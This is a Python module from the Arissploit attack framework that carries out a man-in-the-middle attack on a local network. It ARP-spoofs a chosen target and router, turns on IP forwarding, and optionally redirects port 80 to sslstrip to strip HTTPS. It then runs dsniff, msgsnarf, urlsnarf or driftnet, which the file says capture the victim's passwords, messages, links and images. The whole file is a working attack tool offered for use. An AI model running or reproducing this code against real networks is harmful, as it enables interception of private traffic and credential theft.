from core.arissploit import *
from core import colors
import subprocess
import os

conf = {
	"name": "mitm",
	"version": "1.0",
	"shortdesc": "Man in the middle attack.",
	"author": "Entynetproject",
	"initdate": "26.4.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "dsniff", "driftnet", "sslstrip"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['eth0', 'Network interface name.']),
	('router', ['192.168.1.1', 'Router ip address.']),
	('target', ['192.168.1.2', 'Target ip address.']),
	('sniffer', ['dsniff', 'Sniffer name (select from sniffer list).']),
	('ssl', ['true', 'SSLStrip, for SSL hijacking [true/false].']),
))

# Additional notes to options
option_notes = colors.green+' Sniffers\t Description'+colors.end+'\n --------\t ------------\n dsniff\t\t Sniff all passwords.\n msgsnarf\t Sniff all text of victim messengers.\n urlsnarf\t Sniff victim links.\n driftnet\t Sniff victim images.'

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	if variables['sniffer'][0] =='dsniff':
		selected_sniffer = 'dsniff -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='msgsnarf':
		selected_sniffer = 'msgsnarf -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='urlsnarf':
		selected_sniffer = 'urlsnarf -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='driftnet':
			selected_sniffer = 'driftnet -i ' + variables['interface'][0]
	else:
		printError('invalid sniffer!')

	if variables['ssl'][0] =='true':
		subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("IP forwarding...")
	subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("Arp spoofing...")
	arp_spoofing1 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['target'][0] +' '+ variables['router'][0]
	subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
	subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("Sniffer starting...")
	printInfo("Ctrl + C to end.")
	os.system(selected_sniffer)
